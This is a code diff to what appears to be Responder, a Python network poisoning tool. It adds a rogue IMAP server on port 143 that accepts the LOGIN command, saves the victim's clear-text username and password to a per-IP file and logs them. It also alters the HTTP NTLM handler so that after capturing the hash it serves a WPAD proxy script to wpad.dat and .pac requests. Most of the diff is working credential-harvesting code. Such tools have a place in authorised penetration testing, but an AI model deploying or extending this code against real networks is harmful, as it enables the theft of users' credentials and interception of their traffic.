@@ -62,6 +62,7 @@ SMB_On_Off = config.get('Responder Core', 'SMB').upper()
 SQL_On_Off = config.get('Responder Core', 'SQL').upper()
 FTP_On_Off = config.get('Responder Core', 'FTP').upper()
 POP_On_Off = config.get('Responder Core', 'POP').upper()
+IMAP_On_Off = config.get('Responder Core', 'IMAP').upper()
 SMTP_On_Off = config.get('Responder Core', 'SMTP').upper()
 LDAP_On_Off = config.get('Responder Core', 'LDAP').upper()
 DNS_On_Off = config.get('Responder Core', 'DNS').upper()
@@ -162,7 +163,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\n[+]Loading Responder.conf File..\nGlobal Parameters set:\nResponder is bound to this interface:%s\nChallenge set is:%s\nWPAD Proxy Server is:%s\nWPAD script loaded:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nIMAP Server is:%s\nPOP3 Server is:%s\nSMTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways Serving a Specific File via HTTP&WPAD is:%s\n\n"%(BIND_TO_Interface, NumChal,WPAD_On_Off,WPAD_Script,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,IMAP_On_Off,POP_On_Off,SMTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -1109,9 +1110,14 @@ def PacketSequence(data,client):
        if packetNtlm == "\x03":
           NTLM_Auth= b64decode(''.join(a))
           ParseHTTPHash(NTLM_Auth,client)
-          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
-          buffer1.calculate()
-          return str(buffer1)
+          if re.search('(/wpad.dat|/*\.pac)', data):
+             buffer1 = WPADScript(Payload=WPAD_Script) #Fix login prompt for wpad.
+             buffer1.calculate()
+             return str(buffer1)
+          else:
+             buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+             buffer1.calculate()
+             return str(buffer1)
     if b:
        GrabCookie(data,client)
        GrabURL(data,client)
@@ -1589,6 +1595,34 @@ class ESMTP(BaseRequestHandler):
            pass
 
 ##################################################################################
+#IMAP4 Stuff
+##################################################################################
+from IMAPPackets import *
+
+#ESMTP server class.
+class IMAP(BaseRequestHandler):
+
+    def handle(self):
+        try:
+          self.request.send(str(IMAPGreating()))
+          data = self.request.recv(1024)
+          if data[5:15] == "CAPABILITY":
+             RequestTag = data[0:4]
+             self.request.send(str(IMAPCapability()))
+             self.request.send(str(IMAPCapabilityEnd(Tag=RequestTag)))
+             data = self.request.recv(1024)
+          if data[5:10] == "LOGIN":
+             Credentials = data[10:].strip()
+             Outfile = os.path.join(ResponderPATH,"IMAP-Clear-Text-Password-"+self.client_address[0]+".txt")
+             WriteData(Outfile,Credentials, Credentials)
+             print '[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials)
+             logging.warning('[+]IMAP Credentials from %s. ("User" "Pass"): %s'%(self.client_address[0],Credentials))
+             self.request.send(str(ditchthisconnection()))
+             data = self.request.recv(1024)
+
+        except Exception:
+           pass
+##################################################################################
 #Loading the servers
 ##################################################################################
 
@@ -1659,6 +1693,13 @@ def Is_SMTP_On(SMTP_On_Off):
        return False
 
 #Function name self-explanatory
+def Is_IMAP_On(IMAP_On_Off):
+    if IMAP_On_Off == "ON":
+       return thread.start_new(serve_thread_tcp,('', 143,IMAP))
+    if IMAP_On_Off == "OFF":
+       return False
+
+#Function name self-explanatory
 def Is_DNS_On(DNS_On_Off):
     if DNS_On_Off == "ON":
        return thread.start_new(serve_thread_udp,('', 53,DNS)),thread.start_new(serve_thread_tcp,('', 53,DNSTCP))
@@ -1722,6 +1763,7 @@ def main():
       Is_DNS_On(DNS_On_Off)
       Is_POP_On(POP_On_Off)
       Is_SMTP_On(SMTP_On_Off)
+      Is_IMAP_On(IMAP_On_Off)
       #Browser listener loaded by default
       thread.start_new(serve_thread_udp,('', 138,Browser))
       ## Poisoner loaded by default, it's the purpose of this tool...
